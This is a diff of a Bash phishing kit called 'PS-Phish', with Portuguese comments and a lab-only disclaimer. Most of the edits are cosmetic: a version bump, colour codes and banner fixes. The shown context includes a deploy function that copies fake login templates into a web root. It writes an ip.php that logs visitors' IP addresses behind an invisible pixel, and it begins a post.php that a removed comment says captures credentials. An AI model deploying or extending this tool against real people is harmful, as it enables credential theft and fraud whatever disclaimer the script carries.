@@ -3,7 +3,7 @@
 #  PS-Phish - Ferramenta de Simulação de Phishing
 #  Autor: PeekSecurity Team
 #  Uso exclusivo em laboratórios autorizados.
-#  Versão: 3.0
+#  Versão: 3.2
 # ======================================================================
 
 # ----------------------------- CONFIGURAÇÕES ----------------------------
@@ -16,6 +16,8 @@ CAPTURE_DIR=".server/captures"
 LOG_FILE="$SERVER_DIR/ps-phisher.log"
 
 # Cores neon / matrix
+RESET="\033[0m"
+DIM="\033[2m"
 BOLD="\033[1m"
 RED="\033[91m"
 GREEN="\033[92m"
@@ -32,10 +34,10 @@ banner() {
     clear
     echo -e "${MATRIX_COLOR}"
     echo "  [+] ======================================== [+]"
-    echo "  [+}                                          {+]"
+    echo "  [+]                                          [+]"
     echo "  [+]            PS-Phisher v3.2               [+]"
     echo "  [+]          PeekSecurity Team               [+]"
-    echo "  [+}                                          {+]"
+    echo "  [+]                                          [+]"
     echo "  [+] ======================================== [+]${RESET}"
     echo
 }
@@ -187,7 +189,6 @@ deploy_template() {
     [[ ! -d "$SITES_DIR/$site" ]] && die "Template '$site' não encontrado."
     echo -e "${CYAN}[+] Implantando template: $site${RESET}"
     cp -r "$SITES_DIR/$site"/* "$WWW_DIR/"
-    # ip.php (captura IP e retorna pixel invisível)
     cat > "$WWW_DIR/ip.php" <<'EOF'
 <?php
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -198,7 +199,6 @@ header('Content-Type: image/gif');
 echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
 ?>
 EOF
-    # post.php (captura credenciais)
     cat > "$WWW_DIR/post.php" <<'EOF'
 <?php
 if ($_POST) {
